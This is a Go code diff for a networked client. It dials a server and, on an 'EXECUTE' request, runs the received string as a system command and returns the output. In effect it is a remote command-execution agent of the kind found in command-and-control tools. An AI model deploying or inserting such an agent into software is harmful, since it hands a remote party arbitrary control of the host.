@@ -15,29 +15,22 @@ import (
 // ============================Exportables==========================
 
 type Client struct {
-	AddrToJoin       string
-	Port             string
-	commandToExecute chan string
+	Conn net.Conn
 }
 
-func NewClient(addr, port string) Client {
-	commandBuffer := make(chan string, 1)
-	return Client{AddrToJoin: addr, Port: port, commandToExecute: commandBuffer}
+// Not sure if this is a good idea
+func NewClient(addr, port string) (Client, error) {
+	addrWithPort := addr + ":" + port
+	conn, err := net.Dial("tcp", addrWithPort)
+
+	return Client{Conn: conn}, err
 }
 
 func (client *Client) Communicate() {
-	addr := client.AddrToJoin + ":" + client.Port
-	conn, err := net.Dial("tcp", addr)
-
-	if err != nil {
-		// TODO
-	}
-
-	defer client.tryNotifyAndClose(&conn)
-	defer println("Works") // DEBUG
-	conn.SetDeadline(time.Time{})
-
-	go client.handleReceives(&conn)
+	defer client.tryNotifyAndClose()
+	defer println("Works")               // DEBUG
+	client.Conn.SetDeadline(time.Time{}) // This returns an error but idk what to do with it
+	go client.handleReceives()
 
 	// Prevents the process from exiting right away
 	sig := make(chan os.Signal, 1)
@@ -45,14 +38,27 @@ func (client *Client) Communicate() {
 	<-sig
 }
 
+func (client *Client) Send(
+	statusCode StatusCode,
+	bytes []byte,
+) error {
+	payload := []byte{statusCode}
+	payload = append(payload, bytes...)
+
+	if _, err := client.Conn.Write(payload); err != nil {
+		// TODO (idk what to do)
+	}
+
+	return nil
+}
+
 // ==============================Internals============================
 
-func (client *Client) handleReceives(connPtr *net.Conn) {
-	conn := *connPtr
+func (client *Client) handleReceives() {
 	buffer := make([]byte, 1024)
 
 	for {
-		n, err := conn.Read(buffer)
+		n, err := client.Conn.Read(buffer)
 
 		switch err {
 		case net.ErrClosed:
@@ -70,25 +76,24 @@ func (client *Client) processRequestAndSendResponse(req Request) {
 	case PING:
 		// TODO
 	case REQUESTING_CLOSE:
-		// TODO
+		os.Exit(0)
 	case REDIRECT:
 		// TODO
+		// Maybe freeze all goroutines till it redirects successfully
 	case EXECUTE:
-		// TODO
 		rawCommand := strings.TrimSuffix(req.Payload, "\n")
 		command, params := parseIntoCommandAndParams(rawCommand)
 		out, err := exec.Command(command, params...).Output()
 
 		if err != nil {
-			// TODO
+			client.Send(OUTPUT_WITH_ERROR, out)
 		} else {
-			// TODO
+			client.Send(OUTPUT, out)
 		}
 	}
 }
 
-func (client *Client) tryNotifyAndClose(connPtr *net.Conn) {
-	conn := *connPtr
-	conn.Write([]byte{REQUESTING_CLOSE})
+func (client *Client) tryNotifyAndClose() {
+	client.Conn.Write([]byte{REQUESTING_CLOSE})
 	os.Exit(0)
 }
